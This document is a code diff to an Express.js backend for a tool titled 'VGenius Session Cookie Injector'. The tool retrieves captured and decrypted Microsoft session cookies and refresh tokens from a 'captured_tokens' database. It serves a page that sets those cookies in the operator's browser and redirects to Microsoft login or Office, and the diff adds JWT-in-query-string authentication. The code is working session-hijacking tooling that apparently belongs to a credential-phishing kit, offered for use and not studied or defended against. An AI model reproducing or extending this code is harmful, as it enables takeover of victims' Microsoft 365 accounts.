@@ -1,16 +1,30 @@
 const express = require('express');
 const router = express.Router();
 const db = require('../database/connection');
-const { userAuth } = require('../middleware/auth');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const config = require('../config/env');
 
-// ─── Cookie Injector Page ───────────────────────────────────────────
-router.get('/page/:id', userAuth, async (req, res) => {
+// ─── Cookie Injection Page - Redirect Method ────────────────────────
+// Accepts JWT via query param (?jwt=xxx) for popup-based injection
+router.get('/page/:id', async (req, res) => {
   try {
+    // Extract JWT from query param or header
+    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
+    if (!jwtToken) {
+      return res.status(401).json({ error: 'Authentication required' });
+    }
+
+    // Verify JWT token
+    let decoded;
+    try {
+      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
+    } catch (err) {
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    }
+
     const [tokens] = await db.query(
       'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
-      [req.params.id, req.user.id]
+      [req.params.id, decoded.user_id]
     );
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
@@ -19,28 +33,19 @@ router.get('/page/:id', userAuth, async (req, res) => {
     const refreshToken = decrypt(token.refresh_token_encrypted);
     const cookies = decrypt(token.cookies_encrypted);
 
-    if (!accessToken && !refreshToken && !cookies) {
+    if (!cookies && !accessToken && !refreshToken) {
       return res.status(400).send('No tokens available');
     }
 
     var cookiesList = [];
-
     if (cookies) {
       cookiesList = parseCookies(cookies);
     } else {
       if (accessToken) {
-        cookiesList.push({
-          name: 'x-ms-RefreshTokenCredential',
-          value: accessToken,
-          domain: '.login.microsoftonline.com'
-        });
+        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
       }
       if (refreshToken) {
-        cookiesList.push({
-          name: 'RefreshToken',
-          value: refreshToken,
-          domain: '.login.microsoftonline.com'
-        });
+        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
       }
     }
 
@@ -52,19 +57,34 @@ router.get('/page/:id', userAuth, async (req, res) => {
     var tenant = token.tenant || config.AZURE_TENANT || 'common';
     var tokenId = req.params.id;
 
-    res.type('html').send(generateInjectorPage(cookiesList, clientId, tenant, tokenId));
+    res.type('html').send(generateRedirectPage(cookiesList, clientId, tenant, tokenId, jwtToken));
   } catch (err) {
     console.error('[CookieInject] Page error:', err);
     res.status(500).send('Server error');
   }
 });
 
-// ─── Direct Cookie Injection API ────────────────────────────────────
-router.get('/raw/:id', userAuth, async (req, res) => {
+// ─── Direct Cookie String API ───────────────────────────────────────
+// Accepts JWT via query param for popup-based injection
+router.get('/raw/:id', async (req, res) => {
   try {
+    // Extract JWT from query param or header
+    let jwtToken = req.query.jwt || (req.headers.authorization || '').replace('Bearer ', '');
+    if (!jwtToken) {
+      return res.status(401).json({ error: 'Authentication required' });
+    }
+
+    // Verify JWT token
+    let decoded;
+    try {
+      decoded = require('jsonwebtoken').verify(jwtToken, config.JWT_SECRET);
+    } catch (err) {
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    }
+
     const [tokens] = await db.query(
       'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
-      [req.params.id, req.user.id]
+      [req.params.id, decoded.user_id]
     );
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
@@ -82,18 +102,10 @@ router.get('/raw/:id', userAuth, async (req, res) => {
       cookiesList = parseCookies(cookies);
     } else {
       if (accessToken) {
-        cookiesList.push({
-          name: 'x-ms-RefreshTokenCredential',
-          value: accessToken,
-          domain: '.login.microsoftonline.com'
-        });
+        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
       }
       if (refreshToken) {
-        cookiesList.push({
-          name: 'RefreshToken',
-          value: refreshToken,
-          domain: '.login.microsoftonline.com'
-        });
+        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
       }
     }
 
@@ -139,7 +151,6 @@ function parseCookies(cookieString) {
       var value = pair.substring(eqIndex + 1).trim();
       var nameLower = name.toLowerCase();
 
-      // Skip cookie attributes
       if (nameLower === 'expires' ||
           nameLower === 'max-age' ||
           nameLower === 'domain' ||
@@ -151,10 +162,8 @@ function parseCookies(cookieString) {
         continue;
       }
 
-      // Skip empty values
       if (!value || value.length === 0) continue;
 
-      // Store unique cookies by lowercase name
       seenNames[nameLower] = {
         name: name,
         value: value,
@@ -173,15 +182,14 @@ function parseCookies(cookieString) {
   return cookies;
 }
 
-// ─── Generate Injector HTML Page ────────────────────────────────────
-function generateInjectorPage(cookies, clientId, tenant, tokenId) {
+// ─── Generate Redirect-Based Injector Page ──────────────────────────
+function generateRedirectPage(cookies, clientId, tenant, tokenId, jwtToken) {
   var cookieJson = JSON.stringify(cookies);
   var expires = new Date();
   expires.setFullYear(expires.getFullYear() + 100);
   var expStr = expires.toUTCString();
 
-  var html = '<!DOCTYPE html>\n';
-  html += '<html lang="en">\n<head>\n';
+  var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
   html += '  <meta charset="UTF-8">\n';
   html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
   html += '  <title>VGenius Cookie Injector</title>\n';
@@ -214,10 +222,10 @@ function generateInjectorPage(cookies, clientId, tenant, tokenId) {
   html += '  </style>\n';
   html += '</head>\n<body>\n';
   html += '  <h1 style="color:#00ccff">VGenius Session Cookie Injector</h1>\n';
-  html += '  <p>This tool will set Microsoft session cookies and redirect you to login.</p>\n';
+  html += '  <p>This will set your Microsoft session cookies and redirect you to Office.</p>\n';
   html += '  <p><strong>Cookies available:</strong> ' + cookies.length + '</p>\n';
   html += '  <p><strong>Token ID:</strong> ' + tokenId + '</p>\n';
-  html += '  <button onclick="startInjection()">INJECT COOKIES & OPEN MICROSOFT LOGIN</button>\n';
+  html += '  <button onclick="startInjection()">SET COOKIES & OPEN OFFICE.COM</button>\n';
   html += '  <div id="status"></div>\n';
   html += '  <div id="details"></div>\n';
   html += '  <script>\n';
@@ -225,7 +233,8 @@ function generateInjectorPage(cookies, clientId, tenant, tokenId) {
   html += '    var expStr = "' + expStr + '";\n';
   html += '    var statusEl = document.getElementById("status");\n';
   html += '    var detailsEl = document.getElementById("details");\n';
-  html += '    var tokenId = "' + tokenId + '";\n\n';
+  html += '    var tokenId = "' + tokenId + '";\n';
+  html += '    var jwtToken = "' + jwtToken + '";\n\n';
 
   // Show cookie details
   html += '    function showDetails() {\n';
@@ -242,21 +251,21 @@ function generateInjectorPage(cookies, clientId, tenant, tokenId) {
   html += '    function startInjection() {\n';
   html += '      setStatus("Fetching cookies from server...", "info");\n\n';
 
-  // Fetch raw cookies from API
-  html += '      fetch("/api/tokens/inject/raw/" + tokenId)\n';
+  // Fetch raw cookies from API WITH JWT AUTH
+  html += '      fetch("/api/tokens/inject/raw/" + tokenId + "?jwt=" + encodeURIComponent(jwtToken))\n';
   html += '        .then(function(r) { return r.json(); })\n';
   html += '        .then(function(data) {\n';
   html += '          if (!data.success) throw new Error(data.error);\n';
-  html += '          setStatus("Got ' + cookies.length + ' cookies. Setting them now...", "info");\n';
-  html += '          setCookiesInBrowser(data.cookie_string);\n';
+  html += '          setStatus("Got ' + cookies.length + ' cookies. Setting them...", "info");\n';
+  html += '          setCookiesAndRedirect(data.cookie_string);\n';
   html += '        })\n';
   html += '        .catch(function(err) {\n';
   html += '          setStatus("Error: " + err.message, "error");\n';
   html += '        });\n';
   html += '    }\n\n';
 
-  // Set cookies in browser
-  html += '    function setCookiesInBrowser(cookieString) {\n';
+  // Set cookies directly on current page, then redirect
+  html += '    function setCookiesAndRedirect(cookieString) {\n';
   html += '      var parts = cookieString.split("; ");\n';
   html += '      var count = 0;\n';
   html += '      for (var i = 0; i < parts.length; i++) {\n';
@@ -271,10 +280,10 @@ function generateInjectorPage(cookies, clientId, tenant, tokenId) {
   html += '          }\n';
   html += '        } catch (e) {}\n';
   html += '      }\n';
-  html += '      setStatus("Set ' + count + ' cookies on current origin. Redirecting to Microsoft login...", "success");\n';
+  html += '      setStatus("Set ' + count + ' cookies. Redirecting to Microsoft Office...", "success");\n';
   html += '      detailsEl.innerHTML += "<p>Cookies set: " + count + "</p>";\n\n';
 
-  // Redirect to Microsoft with the client_id from env
+  // Redirect to Microsoft with tenant-specific client_id
   html += '      setTimeout(function() {\n';
   html += '        var msUrl = "https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?";\n';
   html += '        msUrl += "client_id=' + clientId + '";\n';
@@ -282,7 +291,7 @@ function generateInjectorPage(cookies, clientId, tenant, tokenId) {
   html += '        msUrl += "&response_type=code";\n';
   html += '        msUrl += "&scope=openid%20profile%20email";\n';
   html += '        window.location.href = msUrl;\n';
-  html += '      }, 1500);\n';
+  html += '      }, 1000);\n';
   html += '    }\n\n';
 
   // Status helper
